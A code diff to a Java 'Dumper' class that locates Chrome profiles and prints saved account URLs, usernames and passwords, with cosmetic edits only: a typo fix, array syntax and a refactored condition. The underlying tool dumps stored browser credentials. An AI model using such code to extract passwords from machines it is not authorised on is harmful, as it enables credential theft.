@@ -30,7 +30,7 @@ public class Dumper {
         final File chromeInfo = new File(chromeInstall.toString(), "Local State");
 
         if (Files.notExists(chromeInstall)) {
-            throw new IOException("Google chrome intallation not found.");
+            throw new IOException("Google chrome installation not found.");
         }
 
         ArrayList<ChromeProfile> chromeProfiles;
@@ -41,7 +41,7 @@ public class Dumper {
                 break;
             case MAC:
                 final String line = infoLines[0];
-                final String lines[] = line.split("\\{|\\}");
+                final String[] lines = line.split("\\{|\\}");
                 chromeProfiles = Dumper.readProfiles(lines);
                 break;
             default:
@@ -152,10 +152,10 @@ public class Dumper {
             lines.add("==================================================");
             if (accounts.length > 0) {
                 for (final ChromeAccount account : accounts) {
-                    if (onlyWithPsw
+                    boolean returnInfo = onlyWithPsw
                             ? !account.getPassword().equals("")
-                            : !account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("")
-                            ) {
+                            : !account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("");
+                    if (returnInfo) {
                         lines.add("URL:\t\t" + account.getURL());
                         lines.add("Username:\t" + account.getUsername());
                         lines.add("Password:\t" + account.getPassword());
